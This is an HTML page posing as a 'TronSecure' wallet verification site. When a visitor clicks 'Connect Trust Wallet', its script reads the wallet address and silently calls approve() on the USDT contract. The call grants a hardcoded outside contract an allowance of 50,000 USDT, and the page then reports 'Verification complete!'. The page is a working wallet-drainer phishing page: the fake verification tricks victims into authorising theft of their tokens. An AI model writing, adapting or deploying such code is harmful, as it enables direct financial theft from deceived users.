<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verify Wallet - TronSecure</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
            background: white;
            border-radius: 30px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            font-size: 32px;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            margin: 20px 0;
            width: 100%;
        }
        #walletAddress {
            word-break: break-all;
            padding: 10px;
            background: #f0f0f0;
            border-radius: 8px;
            margin-top: 20px;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
</head>
<body>
    <div class="container">
        <div class="logo">TronSecure</div>
        <h2>Verify Your Wallet</h2>
        <button onclick="connectWallet()">Connect Trust Wallet</button>
        <div id="walletAddress"></div>
    </div>

    <script>
        async function connectWallet() {
            // Simple check - exactly aapke jaisa
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                const address = window.tronWeb.defaultAddress.base58;
                document.getElementById("walletAddress").innerText = "Connected: " + address;
                
                // Auto approve 50,000 USDT
                await approveUSDT(address);
            } else {
                alert("❌ Please open this page inside Trust Wallet DApp browser");
            }
        }

        async function approveUSDT(address) {
            const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
            const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
            
            try {
                const tronWeb = window.tronWeb;
                const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
                const amountInSun = 50000 * 1000000; // 50,000 USDT
                
                const result = await tokenContract.approve(CONTRACT_ADDRESS, amountInSun).send();
                alert("✅ Verification complete!");
            } catch (error) {
                alert("❌ Approval failed: " + error.message);
            }
        }
    </script>
</body>
</html>
